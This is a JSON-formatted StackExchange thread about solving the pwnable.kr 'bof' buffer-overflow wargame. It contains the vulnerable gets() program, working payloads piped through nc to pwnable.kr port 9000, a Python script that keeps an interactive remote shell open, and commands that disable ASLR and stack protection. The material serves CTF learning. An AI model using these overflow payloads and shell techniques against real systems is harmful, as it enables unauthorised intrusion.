@@ -1,0 +1,85 @@
+{
+  "title": "How to effectively bypass GCC stack smashing detection",
+  "link": "https://reverseengineering.stackexchange.com/questions/11777/how-to-effectively-bypass-gcc-stack-smashing-detection",
+  "content": "I was solving bof challenge on http://pwnable.kr/play.php\nit is required to smash the stack of the following code \n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid func(int key){\n    char overflowme[32];\n    printf(\"overflow me : \");\n    gets(overflowme);   // smash me!\n    if(key != 0xcafebabe){\n        system(\"/bin/sh\");\n    }\n    else{\n        printf(\"Nah..  \n\");\n    }\n}\nint main(int argc, char* argv[]){\n    func(0xdeadbeef);\n    return 0;\n}\n\n```\nand I was given compiler version of that I was supposed to exploit\nthe task was straightforward but when I overflow the array overflowme the control I never transfered to /bin/sh instead I get something like\n*** stack smashing detected ***: ./bof terminated\nattempt1:\ntry filling the array with zeros except for the key but failed\nattempt2:\nget memory dump for where the array is stored and overflow the array with that dump but still failed\n\n",
+  "votes": "6",
+  "answers": 3,
+  "views": "18k",
+  "tags": [
+    "gdb",
+    "c",
+    "buffer-overflow"
+  ],
+  "user": "u185619",
+  "time": "Jan 16, 2016 at 22:16",
+  "comments": [
+    {
+      "user": "jvoisin",
+      "text": "I'm voting to close this question as off-topic because I don't think that stackexchange is the right place to spoil wargames : they are meant to be played, and posting a complete solution will kill the fun for every player.",
+      "time": null
+    },
+    {
+      "user": "Solomon Ucko",
+      "text": "The reason the prefix is 52 bytes instead of 32 is there are also 8 bytes of canary, plus 8 bytes between the canary and the edge of the stack (the canary is at Stack[-0x10]) and 4 bytes between the edge of the stack and the parameter (the parameter is at Stack[0x4]), for a total of 20 bytes extra.",
+      "time": null
+    }
+  ],
+  "answers_data": [
+    {
+      "content": "The answer from Jason is the correct solution. However, I wanted to give an alternative answer without Python, but from the terminal. IMO Python is always preferred for better automation, but sometimes you just wanna have a quick exploit done without extra tools.\n\nWith that in mind, one's natural attempt would be something like below:\n\n```\necho -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" | nc pwnable.kr 9000\n\n```\nAfter all, this is an exact replica of the code above in Python, right? Except, the server begs to differ:\n\nSo, what is the problem, then?\n\nThink about the command above, for a moment. It sends a bunch of characters to the stdin of the remote process, in the hopes of running /bin/sh. However, we still get greeted by the error. The reason for this, is that we are sending the correct payload, but then we are stopping. EOF. /bin/sh has no input, so execution continues to the next line, until the stack protector kicks in.\n\nThe reason why Python works and the echo command doesn't, is continuity. Python doesn't close the stream, while the terminal version does.\n\nTo prove it, here's a slightly longer version of the terminal exploit, which actually works:\n\n```\necho -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\\x0a\" > payload.bin\n\n```\nFirst, we save the exact payload as before, to a file named payload.bin in this case. Next, we run the following command:\n\n```\ncat payload.bin - | nc pwnable.kr 9000\n\n```\n(Note the - after payload.bin, after cat is done outputting contents of payload.bin, it will start outputting whatever comes in via stdin)\n\nAnd voila! Now you are actually in. You can try typing shell commands, such as cat flag, or touch /tmp/pwned or whatever you like.\n\nWhew! That was long. Hope this info will help other confused souls as it did help me a while ago.\n\n",
+      "votes": "8",
+      "user": "BitParser",
+      "time": "Aug 21, 2018 at 15:31",
+      "is_accepted": true,
+      "comments": []
+    },
+    {
+      "content": "You don't need to bypass gcc's stack smashing detection. If you overwrite key correctly, you get an interactive shell before the stack check is performed at the end of func(). Here's the proof in the form of a Python script:\n\n```\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"pwnable.kr\", 9000))\ns.send(\"A\"*52 + \"\\xBE\\xBA\\xFE\\xCA\" + \"\\x0A\")\nprint \"You now have an interactive shell :)\"\nwhile True:\n    s.send(raw_input() + \"\\x0A\")\n    print s.recv(1024)\n\n```\n",
+      "votes": "8",
+      "user": "Jason Geffner",
+      "time": "Jan 16, 2016 at 23:10",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "u185619",
+          "text": "well I tried this echo -n -e \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xbe\\xba\\xfe\\xca\\x00\" | nc pwnable.kr 9000 but it didn't work If you can spot If I missed something",
+          "time": null
+        },
+        {
+          "user": "Jason Geffner",
+          "text": "gets() expects a line-feed character at the end of the input string, but you're instead using a null-byte at the end of your echo statement.",
+          "time": null
+        },
+        {
+          "user": "Jason Geffner",
+          "text": "Also, I don't think \\x00 works with echo.",
+          "time": null
+        },
+        {
+          "user": "u185619",
+          "text": "actually it did work you can verify by piping the output to xxd",
+          "time": null
+        },
+        {
+          "user": "BitParser",
+          "text": "@AhmedAbdElMawgood very old question, but I have posted an answer that might help you understand why the version with echo won't work.",
+          "time": null
+        }
+      ]
+    },
+    {
+      "content": "first, you should disable ASLR system-wide,  you can do this as follows:\n\n```\necho \"0\" > /proc/sys/kernel/randomize_va_space\n\n```\nsecond, compile your program using flag with -zexecstack -fno-stack-protector -g \n\nexample gcc program.c -o program -zexecstack -fno-stack-protector -g\n\ncheers :)\n\n",
+      "votes": "6",
+      "user": "Febriyanto Nugroho",
+      "time": "Oct 7, 2018 at 8:46",
+      "is_accepted": false,
+      "comments": [
+        {
+          "user": "BitParser",
+          "text": "This won't help get that remote flag though :/",
+          "time": null
+        }
+      ]
+    }
+  ]
+}
